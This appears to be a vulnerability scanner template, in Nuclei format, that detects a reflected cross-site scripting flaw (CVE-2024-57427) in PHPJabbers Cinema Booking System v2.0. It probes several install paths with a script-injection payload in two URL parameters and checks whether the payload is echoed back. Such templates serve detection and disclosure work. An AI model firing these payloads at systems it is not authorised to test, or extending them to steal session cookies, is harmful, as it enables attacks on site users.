id: cinema-booking-reflected-xss

info:
  name: PHPJabbers Cinema Booking System v2.0 - Reflected Cross-Site Scripting (XSS)
  author: ahrixia
  severity: medium
  description: |
    A reflected XSS vulnerability exists in PHPJabbers Cinema Booking System v2.0 due to improper handling of user input in multiple GET and POST parameters.
    Attackers can craft malicious links to steal session cookies or conduct phishing attacks.
  reference:
    - https://www.cve.org/CVERecord?id=CVE-2024-57427
    - https://www.phpjabbers.com/cinema-booking-system/
    - https://github.com/ahrixia/CVE-2024-57427
  classification:
    cve-id: CVE-2024-57427
    cwe-id: CWE-79
  metadata:
    vendor: phpjabbers
    product: cinema-booking-system
    affected-version: "2.0"
    verified: true
  tags: xss,reflected-xss,cinema-booking

variables:
  subdir: 
    - "{{BaseURL}}"
    - "{{BaseURL}}/CinemaBooking"
    - "{{BaseURL}}/CinemaBookingDev"
    - "{{BaseURL}}/booking"
    - "{{BaseURL}}/cinema"
    - "{{BaseURL}}/cinemacms"

requests:
  - method: GET
    path:
      - "{{subdir}}/preview.php?locale=1&hide=0&theme=theme2\"><script>alert(1)</script>"
      - "{{subdir}}/index.php?controller=pjAdminEvents&action=pjActionGetSeats&event_id=14&venue_id=2&date_time=15-12-2024 00:00&index=new_1492\"><script>alert(1)</script>"

    matchers:
      - type: word
        words:
          - "\"><script>alert(1)</script>"
        part: body
